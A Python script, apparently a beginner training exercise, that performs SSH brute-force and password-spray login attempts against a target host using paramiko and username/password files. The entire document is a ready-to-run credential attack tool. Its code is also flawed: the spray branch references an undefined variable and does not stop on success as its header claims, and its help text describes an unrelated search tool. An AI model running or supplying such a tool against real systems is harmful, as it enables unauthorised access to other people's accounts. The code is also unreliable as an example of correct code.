# Beginner Task: Write a script that will perform a password spray
# against the SSH service using a single username and password list.
# It should output each time a username/password combination is failed,
# and stop on a successful log in.

import argparse
import getpass
import paramiko
import sys


def ssh_login(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"Attempting {user}:{passwd}")
    try:
        client.connect(ip, port=port, username=user, password=passwd)
        return True
    except:
        print("Connection failed")
        return False


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Search for a provided list of queries.')
    parser.add_argument('-t', '--target', default='127.0.0.1',
                        help='Target hostname or IP')
    parser.add_argument('-p', '--port', default='22', help='SSH port')
    parser.add_argument('--credfile', default='creds.txt',
                        help='Load comma-separated credentials from file for brute force')
    parser.add_argument('--brute', default=False, action="store_true",
                        help='Brute force attack using comma-separated file of usernames and passwords')
    parser.add_argument('--userfile', default='users.txt',
                        help='Load usernames from file for password spray')
    parser.add_argument('--spray', default=False, action="store_true",
                        help='Perform password spray using provided file containing usernames and a specified password')
    parser.add_argument('--password', default='password', help='Password to use with --spray')

    args = parser.parse_args()

    ip = args.target
    port = args.port

    # brute force
    if args.brute:
        with open(args.credfile, "r") as creds_file:
            credentials = creds_file.readlines()
            for credential in credentials:
                user, password = credential.split(",")
                if ssh_login(ip, port, user, password.rstrip()):
                    print(f"Successful login as {user}:{password.rstrip()}.")
                    sys.exit()

    # credential spray
    if args.spray:
        with open(args.userfile) as userfile:
            users = userfile.readlines()
            for user in users:
                if ssh_login(ip, port, user.rstrip(), args.password):
                    print(f"Successful login as {user}:{password.rstrip()}.")
                    

